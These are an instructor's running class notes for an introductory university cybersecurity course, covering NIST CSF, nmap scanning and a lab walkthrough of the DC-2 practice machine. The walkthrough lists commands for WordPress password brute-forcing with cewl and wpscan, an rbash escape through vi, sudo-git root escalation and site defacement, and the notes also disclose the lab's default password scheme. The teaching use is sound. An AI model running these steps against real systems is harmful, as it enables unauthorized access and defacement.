Class Notes
I'll try to put some notes of the resources, commands, and other things we talk about each day in this file.  This will be a running document.

 

Day 1:
We did introductions and walked through the syllabus. 

Key terms:
APT

Day 2:
We talked about the CIA Triad.  We also introduced frameworks:
https://www.simplilearn.com/what-is-a-cyber-security-framework-article#top_cyber_security_frameworksLinks to an external site. 
https://www.connectwise.com/blog/cybersecurity/11-best-cybersecurity-frameworksLinks to an external site. 
https://www.churchofjesuschrist.org/study/manual/come-follow-me-for-home-and-church-book-of-mormon-2024?lang=engLinks to an external site. 
Frameworks are mechanisms for us to follow that help us learn a subject or helps us complete tasks.  Think of them as providing structure.  We will be using the NIST CSF 2.0 framework as well as the MITRE ATT&CK framework (which we did not talk about today) throughout the class.  

We also spent the last 15-20 minutes accessing the virtual environment.  We made a secure shell (ssh) connection to our jumpbox or bastion host.  The command to do so is: 

ssh <username>@plass201jump.cit.byui.edu  
Your username is your username in your email (everything before the @ symbol).  Your password is your full last name with a capital letter combined with the last 4 digits of your i-Number.

Key terms:
jumpbox
bastion host

Reminder!  Next week's devotional will be held THIS Saturday at 5:00PM.  Elder Uchtdorf will be addressing us!

Day 3:
We talked about the course late work policy.  Look for it on the syllabus.

We then talked about the videos that we watched.  A really good discussion ensued!  I appreciate all the participation.  In general, do we think that Elder Bednar is cracked for talking about this stuff back in 2009, or is he spot on?  

We also discussed the Digital Media (part1) assignment.  

Day 4:
We talked about social engineering.  Social engineering is manipulating (or exploiting) humans to get them to give you privileged (sensitive, secret, etc.) information.  Social engineering could also be used to gain access into controlled spaces.  Specific social engineering tactics included: phishing, smishing, vishing, ransomeware, etc.  We then took the rest of the class period to introduce the 5th Sunday Lesson: Social Engineering assignment.  Students formed groups and worked in those groups to come up with a plan for this presentation.

Day 5:
Today, we talked about the Google Hackers video and how Google indexes almost everything.  They index all the malware that is seen on the internet so they can provide better service to their customers.  They use this info to be able to better filter email coming into your inbox.  This indexing is a form of identifying what is out there.  The NIST CSF 2.0 lists Govern as the first step and Identify as the second.  These are very important steps in the process.  We also watched a video in class on the NIST CSF.  Some of the highlights in the Govern function of the NIST CSF 2.0 are: organization, roles, policy, and risk.  

Day 6:
We continued our discussion on the the NIST CSF 2.0 framework.  We talked about the Govern function of the NIST CSF 2.0.  Many things should be considered in the Govern function:

Organization Chart Network Diagrams
Data Flow Diagrams
Critical Asset, Data and Services List
Rules of Engagement (ROE) Limitations and Boundaries
Incident Response Plan
Business Continuity Plan
Disaster Recovery Plan
Required Notification Guidance
Physical Access Requirements On call/contracted resources
Communication Plan
Authority and Legal Conditions
Threat Intelligence Summary
Risk Assessment Decision Matrix
Data and Info Disclosure Procedures
Consent to Monitor, Collect and Assess Data
MOA/MOU/NDA Documents and Requirements
This is not an all-inclusive list, but you should be starting to assemble these types of things.

Day 7:
We introduced the Identify Function.  This is where you start to identify all of your enterprise assets.  This includes hardware, software, data, people, identities, etc.  We then got into our virtual environment and started doing some nmap scans from our Kali Linux boxes.  Here we identified the systems that are on the network, as well as their operating systems and some of the software (programs) that are running on those systems.  As we identify these programs, we will notice that there are vulnerabilities that are exposed from the "outside" - or from what an attacker can see.  

Some scans that might be beneficial:

nmap -sn 172.16.25.0/24
-- This will scan the network and identify the systems that are up.  But this is just a ping scan, so it won't bring back any additional info on the machines.

sudo nmap -AO 172.16.25.x,y,z
(where x, y, z are your 3 VMs that have been assigned you) -- This (-AO) enables OS detection and version detection.  It will bring back a lot of info.  When you use the -O, you will need to run it using sudo.

Sometimes the previous command will not return the operating system for your Windows machine (172.16.25.z above).  If this is the case, try just the -A:

nmap -A 172.16.25.z
Day 8:

We used today as a work day to try to complete the Identify: Risk Assessment assignment as well as the Nmap: (VM Environment) assignment.  We got back onto our virtual environment and continued to do additional scans.

Day 9:
Today was the Protect function of the NIST CSF.  

We need to protect (defend) the assets we have.  But how do we do that?  There's multiple ways and you likely need to employ multiple different solutions.  

Using the info we gathered from the Identify function, we need to now protect or defend them
Protect is continuous!
How do we do that?
Protect is HUGE - Data, data classification, systems, SW, network infrastructure, accounts/users, MFA, vulnerability (or patch) management, log management, email & web protections, anti-malware defenses, network monitoring, security awareness training, 3rd parties, 
Networks of yesteryear vs. today
Yesteryear - Defend the perimeter
limit egress
fortify one or two ingress/egress paths
Today - Identity is the new perimeter
How do we defend this?
Infinite ingress/egress points
Let's look at a few of them:
MFA - everywhere!!!
system hardening
locking down ports
access control lists
disabling ports
Least priv
Only give perms out to those that really need it
admin rights should be an exception, not the rule
Separation of duties
separate accounts for different uses
Conditional access policies
IFTT
Policies
Policies need to be written such that users know what's expected and what's allowed/disallowed
Needs to have teeth
Needs to be top-down driven
Risk needs to be owned by C-Suite
We spent the last 10-15 minutes of class getting onto our Windows VMs.  To access your Windows VM, you need to set up a tunnel locally on your box.  Open terminal and type the following command:

ssh -L 4444:172.16.25.XXX:3389 <username>@plass201jump.cit.byui.edu
Where XXX is the IP address of YOUR WINDOWS VM and <username> is your username.

Once you create this tunnel and successfully authenticate, open up Remote Desktop Connection (Windows Users), Windows App (Mac Users), and Remmina (Linux users).  You'll connect to 127.0.0.1:4444 (assuming you used port 4444 in your tunnel).

Day 10:
Today we finished up the Protect function of the NIST CSF.  We got on our Windows boxes (see Day9 above) and hardened them.  We did this by shutting down services and deleting unused user accounts.  

Day 11:
We talked about the Detect function of the NIST CSF 2.0.  We talked about the following items that are important to consider when thinking about Detect:  The difference between an IDS and an IPS.  When detecting adversarial activity, we will want to watch the network for probing, lateral movement, and other adversarial movements.  We'll also want to watch for them trying to bypass anti-virus and other evasion techniques.  You'll also want to watch for any root/admin/system usage in the network, because you restricted admin rights in the Protect function, right???  

We introduced this concept of continuous monitoring, where we have agents on each of our systems that are reporting back to a Security Information and Event Management System (SIEM).  The SIEM is a "single pane of glass" for us to look at.  It's a one-stop place to look for all the logs in the network.  Remember, a SIEM aggregates and correlates these logs to make your job easier.  When you need to investigate something, you can go to the SIEM to investigate instead of going to individual devices throughout the network.

Day 12:
Today we got into the class virtual environment and played around with the SIEM.  We looked at the dashboards that contain events.  The events have a lot of data in them ... so go look at that.  There's also a tab for Alerts.  Alerts are notifications saying that a pre-defined threshold has been met or exceeded.  Alerts can also notify you that a certain signature has been detected in the network.  We worked through the Detect: SIEM and the Detect: Logging and Monitoring assignments in class and as groups.

Day 13:
We moved on to the Respond and Recover functions of the NIST CSF 2.0 Download NIST CSF 2.0.  (You might also want to take a look at the NIST Incident Handling Guide (NIST.SP.800-61r2.pdf Download NIST.SP.800-61r2.pdf).)

There are many parts of the Respond function, but one of the key pieces is the written incident response plan.  It needs to be written so that everyone knows what their responsibilities are during an incident as well as it gives you the "playbook" on what to do and in what order.  NIST also breaks the Respond Function down into the following sections:

preparation
detection & analysis
containment, eradication, & recovery
post-incident activity
Although most of your time and effort during an incident are going to be in containment, eradication, & recovery, I would argue that most of your time before an incident be focused on preparation.

We then migrated to the Recovery function of the NIST CSF 2.0.  It is imperative that you have the following when it comes to Recovery:

Do you have, and does everyone know what their role is in each of the following:
Incident response plan
BCP
Disaster Recovery Plan
Continuity of Operations Plan
Do you have backups?
Have you tested your backups?
Cyber Insurance phone number/contact?
Day 14:
We did hands on today with respond and recover.  We also did a review for the midterm.

Day 15:
Midterm day!!!  We also did a few 5th Sunday presentations.

Day 16:
This day was dedicated to 5th Sunday presentations.

Day 17:
We introduced red team, or offense.  We introduced the MITRE ATT&CK framework.  The 5 tactics from the MITRE ATT&CK framework that we'll cover this semester are:  Reconnaissance, Scanning & Enumeration, Gain Access, Privilege Escalation, and Impact.  We then spent a good portion of the class period talking about Recon.  

Recon is super important to the attack cycle because this is where all the homework is done.  The chances of getting caught are very low.  Recon can be divided into two categories: Passive and Active.  

Passive Reconnaissance is where Passive = you are not interacting with the target directly.  All info is primarily being retrieved indirectly - i.e. using a search engine.  Passive recon could also be where you look like you are an average user of their webpage.  Basically blending in with other traffic and nothing you can do is causing harm to or can be tied back to you.

Active Reconnaissance is interacting with the target or their systems or persons.  Activities you are doing can be tied back to you.  Things you do could impact the performance of their systems or alter them.  

We also spent a minute refreshing ourselves with the Class Code of Ethics - found on the class homepage.

After all this, I introduced the OSINT assignment.  OSINT stands for Open Source Intelligence.  Students were given the target for the assignment.  They were also instructed they could any open source intelligence source, but could not pay for a source.

Day 18:
We talked about scanning and enumeration.  Funny thing is that this isn't any different than when we learned about this for Blue team.  You just have to think of things a little differently.  You have to think about what vulnerabilities could be exploited instead of what things need to be protected.  We can use the same types of tools.  Nmap is our friend here.  This will help us to positively identify a target.  It will also help enumerate what software or services might be running or what ports might be open.  

Day 19:
Today we looked at Linux commands.  Network Chuck does a great job, but he goes too fast!  We looked at the following:

pwd
ls
cd
rm
cp
mv
w or who
id
ifconfig or ip addr or ip a
ping
traceroute
cat
less
grep
find
sudo
su
history
chmod
ps
man

You don't need to be an expert on these commands, but you should be familiar with most of them.

Day 20:
Today, we enumerated our target - the dc-2 machine.  Unfortunately, we had to do a little setting up to get there, but we got there.  Start by setting up and creating a tunnel that will allow you to get to both your Windows machine as well as your Kali box.  Once you've gotten on both of these VMs, please go to your Windows VM and use a web browser to pull up the target's website (use the target's IP address).  This should redirect you so that "dc-2" is in your address bar.  See what you can find here.  Sometimes administrators leave clues or "flags" for us to find.  You should see some clues there that will help you on the next few steps.

Next, head over to your Kali machine.  One of the first clues that was given in that first flag was that you just "need to be cewl."  It just so happens that cewl is a tool that is available to us on Kali.  It is a custom word list generator.  It scrapes a website and generates potential passwords off of that.

Here's the process on how to work through this:

nmap -A -p- 172.16.25.<dc-2 IP>  --> Make note of the open ports and the services running on said ports.

cewl -d 3 -w passwords.txt 172.16.25.<dc-2 IP>

cat passwords.txt --> Didn't work ... how can we make this work?

edit /etc/hosts --> sudo nano /etc/hosts

In this file, change the 3rd line so that it reads correctly.  For example, mine would be:
172.16.25.11     dc-2      ***Note that I had to change my IP AND my hostname.

cewl -d 3 -w passwords.txt http://dc-2/Links to an external site.

cat passwords.txt --> Much better!  

wc -l passwords.txt --> This gives us a count of how many passwords are in the file.  Anything > 0 tells us that it worked.

nikto -h http://dc-2/  --> Nikto is a website scanning tool. It is looking for known vulnerabilities.Links to an external site.

wpscan --enumerate --url http://dc-2/Links to an external sitLinks to an external site. --> wpscan is a tool to find vulnerabilities specifically in WordPress sites.  This is so CEWL ... I mean Cool!  We found users!  

wpscan --url http://dc-2/ -P passwords.txt --> Let's feed it some passwords.

What did you find???  How can you now use this information?  Remember to start looking at the Gain Access: Credential Mining (VMWare Environment) page.

Day 21:
Our wonderful wpscan tool gave us the passwords to Tom and Jerry.  Unfortunately, it didn't return the creds for Admin.  But we can use those passwords to log into the dc-2 box at dc-2/wp-login.php (remember we found this page using nikto?).

On the webpage, we can find flag2.  Remember ... if you can't find it on one, try another.  So, you may have to log in as another - and another way.

Once we get the flag on the webpage, we'll have to SSH to get more stuff.  We try with Jerry, but it doesn't look like Jerry has SSH access.  So, we try as Tom.  I'd like to point out that the only way this even works is that Tom re-used his WordPress password as his password to log into the machine.  We can see the flag in his home directory, but we can't read it using cat.  This is because we're in a restricted shell - meaning we have been restricted on the commands we can run.  if we echo $SHELL it returns /bin/rbash.  rbash stands for restricted bash - thus confirming our theory.  Doing a little more digging, we can run echo $PATH.  This will return the path that the computer looks at when it needs to run any programs (called binaries in Linux).  The only location in our $PATH is: /home/tom/usr/bin.  If we ls -latr /home/tom/usr/bin we find we only have 4 commands available to us: less, vi, scp, and ls.  We could use vi to view the contents of our flag, but vi is such a pain.  So let's use less instead: less flag3.txt.  This tells us that Tom should su jerry.  But we don't have su available to us right now, so we need to rectify that.  

To do so, we need to abuse some features of vi.  Let's try the following commands:

vi

:set shell=/bin/sh --> We're setting the shell variable with the /bin/sh command.  When you hit enter, it's going to look like nothing is happening ... be patient!  Keep going on.

:shell --> This should've brought you out of vi and back to your command prompt.

/bin/bash --> This gets you into a good Bourne Again ShellLinks to an external site..  

But we are still restricted.  So, we need to fix that:

echo $PATH --> It's always good to echo it out before you modify.  That way you can revert back if something goes south.

export PATH=/bin/:/usr/bin/:/usr/local/bin:$PATH --> This adds all these paths into your $PATH so the computer knows where to look for the binaries.

echo $PATH --> Just to verify everything went through.  It should return: /bin/:/usr/bin/:/usr/local/bin:/home/tom/usr/bin

Now we can su to Jerry ...

su jerry --> If you try to ls -latr, you'll notice that you get access denied.  This is because you're now Jerry, but you're trying to list the contents of /home/tom, which you can't do.  

cd ~ --> fixes this by going to Jerry's home directory.

ls -latr --> SWEET!  We can see flag4.txt.  Just cat that file to read the contents.

cat flag4.txt

But now we're stuck again.  Because what does "git outta here" really even mean?  Since our overall goal is to cause some sort of impact on this system, we'll have to have root access to do that.  And Jerry doesn't have that yet.  So, let's look at what Jerry has permissions to run as root.  

sudo -l --> This lists the commands that Jerry can run as sudo.  And we see that git is listed there.  But just running git doesn't do us much good because it runs and then exits.  We need something that is going to run and then hang or wait for user input.  Because that user input will be run as root!  It just so happens that there is a command that will do that.

sudo git help status --> it's the help menu or manual page.  SWEET!  Now we can issue the next command to break out of here!

!/bin/bash --> Heck yeah!!!  That was easy!  We're now root.  We just have to find the file and read it.

ls -latr --> This doesn't quite work because we're trying to list Jerry's home directory.  

cd ~ --> There we go!!!  I'll let you figure out what to do from here! 

Don't forget to do the assignment.  Escalate Privilege: DC-2 Continued.

Days 22 & 23:
These were the days we've been waiting for!  We caused impact on our target machines.  A successful impact in this class is that you rickrolled the website.  This requires you to have root on the dc-2 machine.  Once you have root, we want to create a backup of the webpage - so we can return things back to the way they were.  You may want to try this a couple times, so it will be nice to be able to revert.  

Our website sits in the /var/www/html directory.  So, if you cd /var/www/html, you will be able to just interact with the files directly.  To create the backup, cp index.php index.php.bak.  Now, if you do an ls -latr, you'll see your backup file at the bottom of that listing.  Now, we can go into our index.php file and modify it.  I delete everything that is there by holding down ctrl+k until everything is blank.  Then, I add content in between 2  html tags like this:
<html>
rickroll stuff goes here
</html>

My web design foo is weak, so that's about as creative as I get.  But you can get WAY more creative than this!!!  Have fun with it!  See if you can get a video up there (remember that you don't have internet access on these machines).  

Day 24:
Review

Day 25:
Final Exam!
